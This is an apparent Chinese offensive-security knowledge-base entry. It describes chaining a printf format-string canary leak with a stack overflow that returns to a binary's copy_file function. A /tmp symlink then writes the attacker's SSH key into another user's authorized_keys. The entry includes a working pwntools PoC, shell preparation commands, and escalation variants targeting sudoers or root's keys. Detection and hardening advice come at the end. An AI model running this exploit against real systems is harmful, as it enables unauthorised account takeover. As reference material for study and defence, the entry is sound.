---
id: binary-pwn-format-string-canary-leak-ret2copy-authorized-keys
title: 格式化字符串泄露 Canary 后栈溢出调用文件复制函数写 authorized_keys
type: scenario
domain: binary
path: binary/pwn/format-string
technique: format-string-canary-leak-ret2filecopy
tags:
- pwn
- format-string
- canary
- stack-overflow
- ret2win
- symlink
- ssh
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V83
  verified_at: '2026-11-05T17:50:23+08:00'
  notes: 已对照原文与图14/15核对：main 为 char s[12] 的 fgets(s,12)+printf(s) 格式串、char s_[72] 的 fgets(s_,120) 溢出，Canary %17$p，偏移 72；copy_file 从 /tmp/sdfile 复制到 /tmp/lsdfile 并 chmod 0600，符号链接指向 /home/nati/.ssh/authorized_keys，图15 成功 SSH nati。fs.protected_symlinks=1 的边界说明合理；PoC 未复跑；无版本。
url: /docs/binary/pwn/format-string/binary-pwn-format-string-canary-leak-ret2copy-authorized-keys/
draft: false
kb_aliases:
- 格式化字符串泄露 canary
- ret2copy_file
- 栈溢出写 authorized_keys
- 符号链接写 SSH 公钥
- printf 泄露栈保护值
---

## 一句话结论

当以更高权限运行的二进制先把用户输入直接交给 `printf`（格式化字符串），再把超长输入读入栈缓冲区时，可先用 `%N$p` 泄露当次运行的 Canary，再溢出返回到二进制自带的文件复制函数；配合 `/tmp` 符号链接把复制目标指向目标用户的 `authorized_keys`，即可写入自己的 SSH 公钥并登录。

## 原理

- `printf(user_input)` 把用户输入当作格式串。`%17$p` 让 printf 直接读取第 17 个可变参数槽（实际是栈上的值）并以十六进制打印，从而泄露 Canary。
- x86-64 的栈保护值最低字节为 `0x00`，目的是防止 `strcpy`/`printf("%s")` 之类的字符串操作越过 Canary；因此扫描 `%i$p` 输出中“以 00 结尾”的 64 位值即可定位 Canary 槽位（同一二进制中通常有多个副本，任选一个固定槽即可）。
- Canary 每次进程启动都随机，必须本次泄露、本次回填；函数返回前用 `fs:0x28` 处的值比较，回填错误会触发 `__stack_chk_fail`。
- 溢出点把 120 字节读入 72 字节缓冲区，偏移 72 到 Canary，随后 8 字节是保存的 RBP，再往后是保存的 RIP。把保存的 RIP 覆盖为二进制内 `copy_file` 的地址（无 PIE 时固定），函数返回时即跳转执行。
- `copy_file` 以 `fopen("/tmp/sdfile","rb")` 读取、`fopen("/tmp/lsdfile","wb")` 写入，最后 `chmod("/tmp/lsdfile", 0600)`；`fopen` 会跟随符号链接。由于程序通过 `sudo -u nati` 运行，整个复制过程以 nati 的权限执行：把 `/tmp/lsdfile` 预先做成指向 `/home/nati/.ssh/authorized_keys` 的符号链接，把公钥写入 `/tmp/sdfile`，即可借程序之手把公钥写进 nati 的授权文件。

## 触发条件

- sudoers 允许当前用户以目标用户身份执行该二进制（如 `sudo -u nati /opt/copy`）。
- 二进制存在“用户输入直接作为 printf 格式串”的漏洞，且 Canary 在固定栈槽可读。
- 同一二进制存在栈溢出，且 Canary 之后的返回地址可控。
- 二进制未启用 PIE（或已泄露代码基址），能确定 `copy_file` 地址。
- 目标用户的 `~/.ssh` 目录存在且可写；`/tmp` 中可创建文件与符号链接。
- 目标系统未启用会阻止跨用户跟随符号链接的加固（如 `fs.protected_symlinks=1` 在粘滞位目录中会拦截“非链接属主”跟随；本场景在未启用该保护的环境成立）。

## 利用步骤

1. `sudo -l` 确认可以 `(nati) /opt/copy` 运行；把二进制下载到本地用 IDA/反汇编分析。
2. 找到 main：`fgets(name,12); printf(name); ... fgets(buf,120);`，确认格式串漏洞与 72 字节缓冲区的溢出。
3. 扫描 Canary 槽位：循环执行 `%1$p` 到 `%100$p`，挑选形如 `0x...00` 且每次运行都变化的值（如 `%17$p`）。
4. 计算偏移：缓冲区到 Canary 为 72，Canary 到保存 RBP 为 8，再到保存 RIP 为 8；payload 为 `b"A"*72 + canary + b"B"*8 + p64(copy_file)`。
5. 在目标上准备：`touch /tmp/sdfile /tmp/lsdfile; chmod 777`；`ln -sf /home/nati/.ssh/authorized_keys /tmp/lsdfile`；把攻击者公钥写入 `/tmp/sdfile`。
6. 运行利用脚本（目标机没有 pwntools 时先建 venv 安装），通过 `sudo -u nati /opt/copy` 启动进程，泄露 Canary 后发送溢出 payload。
7. 程序退出时 `copy_file` 被调用，公钥写入 nati 的 `authorized_keys`；用对应私钥 `ssh nati@target` 登录。

## PoC

```python
import re
from pwn import *

elf = ELF("/opt/copy")
copy_file = elf.symbols["copy_file"]

p = process(["sudo", "-u", "nati", "/opt/copy"])
p.sendline(b"%17$p")                 # 第一次输入作为 printf 格式串
line = p.recvline().decode()
canary = int(re.search(r", (0x[0-9a-f]+)", line).group(1), 16)
log.info(f"canary = {canary:#x}")

payload  = b"A" * 72
payload += p64(canary)
payload += b"B" * 8                  # 保存的 RBP
payload += p64(copy_file)
p.sendline(payload)
p.interactive()
```

```bash
# 目标机准备（以当前低权限用户执行）
cd /tmp
touch sdfile lsdfile && chmod 777 sdfile lsdfile
ln -sf /home/nati/.ssh/authorized_keys lsdfile
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ''
cp ~/.ssh/id_ed25519.pub /tmp/sdfile

# 运行利用脚本后
ssh -i ~/.ssh/id_ed25519 nati@target
```

## 变体与关联

- 变体：Canary 不在固定槽时，可先用 `%p` 链或 `%s` 读内存定位；也可用 `%n` 做任意写直接改 GOT/返回地址，绕过溢出。
- 变体：若二进制是 PIE，先用格式串泄露返回地址/代码指针计算基址，再定位 `copy_file`。
- 变体：目标函数不是 `copy_file` 而是任意 `system`/`execve` 包装时，可把第二段改为 `system("/bin/sh")`；若函数以 root 运行且复制目标可控，也可直接写 `/etc/sudoers.d` 或 root 的 `authorized_keys`。
- 关联：[[binary-pwn-rop-mov-rsp-rdi-jmp-r13-system]]（同一文章的无 Canary ROP 场景）、[[pentest-privilege-escalation-redis-local-ssh-key-root]]（另一条写 authorized_keys 的提权路径）。
- 边界：`fs.protected_symlinks=1` 时，粘滞位目录中非链接属主（这里是 nati）跟随攻击者创建的符号链接会被拒绝，符号链接写入失败；可改用目标用户可写且非粘滞的目录，或寻找不依赖符号链接的文件写原语。

## 检测与防御

- 检测：代码审计中搜索 `printf(user_input)`、`fprintf(f, user_input)`、`syslog(user_input)` 等格式串误用；监控栈保护失败（`__stack_chk_fail`/SIGABRT）与异常返回到文件操作函数的崩溃；观察 `/tmp` 中指向用户家目录的符号链接。
- 修复：格式化输出统一写成 `printf("%s", buf)`；对 `fgets` 读取长度做边界校验；启用 `-fstack-protector-strong`、PIE、Full RELRO。
- 加固：sudo 规则最小化，避免以高权限用户运行可被本地用户交互的程序；开启 `fs.protected_symlinks=1`、`fs.protected_regular=1`；将 `/tmp` 以 `nosymfollow` 选项挂载（内核支持时）。
